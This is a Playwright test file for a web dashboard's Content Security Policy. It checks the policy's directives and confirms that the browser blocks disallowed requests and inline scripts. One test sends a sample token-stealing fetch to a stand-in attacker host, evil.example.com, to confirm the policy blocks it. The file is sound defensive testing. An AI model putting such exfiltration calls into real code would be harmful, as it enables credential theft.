import { test, expect } from "@playwright/test";
import { devOrigin, previewOrigin } from "./ports";

test.describe("Content Security Policy", () => {
  test("meta CSP is present and enforces script and connect restrictions", async ({ page }) => {
    const violations: string[] = [];
    page.on("console", (msg) => {
      if (
        msg.text().toLowerCase().includes("content security policy") ||
        msg.text().toLowerCase().includes("csp")
      ) {
        violations.push(msg.text());
      }
    });

    await page.goto("/");

    // Verify CSP meta tag exists in head
    const cspMeta = page.locator('head meta[http-equiv="Content-Security-Policy"]');
    await expect(cspMeta).toHaveCount(1);
    const content = await cspMeta.getAttribute("content");
    expect(content).toContain("default-src 'self'");
    expect(content).toContain("script-src 'self' 'sha256-Br8YhJpQhIbpnMBUqFn9lgCUnmH2NcVRwo6QgXFzhQQ='");
    expect(content).toContain("connect-src 'self' https://api.github.com");
    expect(content).toContain("img-src 'self' https: data: blob:");
    expect(content).toContain("style-src 'self' 'unsafe-inline' https://fonts.googleapis.com");
    expect(content).toContain("font-src 'self' https://fonts.gstatic.com data:");
    expect(content).toContain("worker-src 'self'");
    expect(content).toContain("object-src 'none'");
    expect(content).toContain("base-uri 'self'");
    expect(content).toContain("form-action 'self'");

    // Verify normal startup produced no CSP violations
    expect(violations).toHaveLength(0);

    // Verify theme script ran and set data-theme
    const dataTheme = await page.locator("html").getAttribute("data-theme");
    expect(dataTheme).toMatch(/^(light|dark)$/);

    // Verify that attempting to fetch from an unauthorized origin triggers a CSP violation
    const unauthorizedBlocked = await page.evaluate(async () => {
      let violationEventFired = false;
      const onViolation = (e: SecurityPolicyViolationEvent) => {
        if (e.blockedURI.includes("evil.example.com")) violationEventFired = true;
      };
      document.addEventListener("securitypolicyviolation", onViolation);
      window.addEventListener("securitypolicyviolation", onViolation);
      try {
        await fetch("https://evil.example.com/steal-token");
      } catch {
        // fetch is expected to fail
      }
      await new Promise(r => setTimeout(r, 100));
      document.removeEventListener("securitypolicyviolation", onViolation);
      window.removeEventListener("securitypolicyviolation", onViolation);
      return violationEventFired;
    });
    expect(unauthorizedBlocked).toBe(true);

    // Verify an unauthorized inline script is blocked from executing
    const inlineScriptBlocked = await page.evaluate(async () => {
      let violationFired = false;
      const onViolation = (e: SecurityPolicyViolationEvent) => {
        if (e.violatedDirective.includes("script-src")) violationFired = true;
      };
      document.addEventListener("securitypolicyviolation", onViolation);
      try {
        const s = document.createElement("script");
        s.textContent = "window.unauthorizedExecuted = true;";
        document.body.appendChild(s);
      } catch {}
      await new Promise(r => setTimeout(r, 100));
      document.removeEventListener("securitypolicyviolation", onViolation);
      return violationFired && !(window as any).unauthorizedExecuted;
    });
    expect(inlineScriptBlocked).toBe(true);
  });

  test("production preview build serves CSP meta tag without violations", async ({ page }) => {
    const violations: string[] = [];
    page.on("console", (msg) => {
      if (
        msg.text().toLowerCase().includes("content security policy") ||
        msg.text().toLowerCase().includes("csp")
      ) {
        violations.push(msg.text());
      }
    });

    await page.goto(`${previewOrigin}/github-dashboard/`);

    const cspMeta = page.locator('head meta[http-equiv="Content-Security-Policy"]');
    await expect(cspMeta).toHaveCount(1);
    expect(violations).toHaveLength(0);
  });
});
